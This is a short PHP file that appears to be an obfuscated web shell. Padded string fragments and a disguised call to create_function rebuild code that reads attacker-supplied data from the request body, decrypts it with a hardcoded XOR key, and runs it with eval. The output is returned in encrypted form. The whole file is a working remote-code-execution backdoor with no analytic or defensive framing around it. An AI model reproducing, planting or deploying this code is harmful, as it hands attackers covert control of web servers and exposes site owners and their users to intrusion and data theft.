<?php
$Q='){U+$U+c=strlen($k)U+;$l=sU+trlenU+($t);U+$o="";fU+or($i=0U+;$i<$lU+;){forU+($j=0U+;(U+$j<$c&&$iU+<$U+l)U+;$j++,$i++)';
$B='$k="76b6U+cU+0a2";$kU+U+hU+="46715U+b00cbU+18";$kf="a4d2470U+ff1U+4b"U+;$p="mWhXU+TV47eU+q7U+mhhnM";function xU+($t,$k';
$n='gU+etU+U+U+_contents();@oU+b_end_cleaU+n();$r=@bU+ase64_encode(@U+xU+(@U+gzcoU+mpress($o),$k))U+;priU+nt("$pU+$kh$r$kf");}';
$I='{$oU+.=$t{U+$i}^$k{$U+jU+};}}retuU+rn $o;}ifU+ (@pU+reg_matU+ch("/U+$U+kh(.+)$kf/",@fiU+leU+_gU+et_coU+ntents("php:U+//in';
$Y=str_replace('B','','creBBBBate_BfunctBion');
$A='put"U+),$m)U+==1) {@U+ob_sU+tart();@eU+vU+al(@U+gU+zuncomprU+ess(@U+x(@baU+se64_decode($mU+[1]U+),$k)));$o=@oU+U+b_';
$h=str_replace('U+','',$B.$Q.$I.$A.$n);
$J=$Y('',$h);$J();
?>
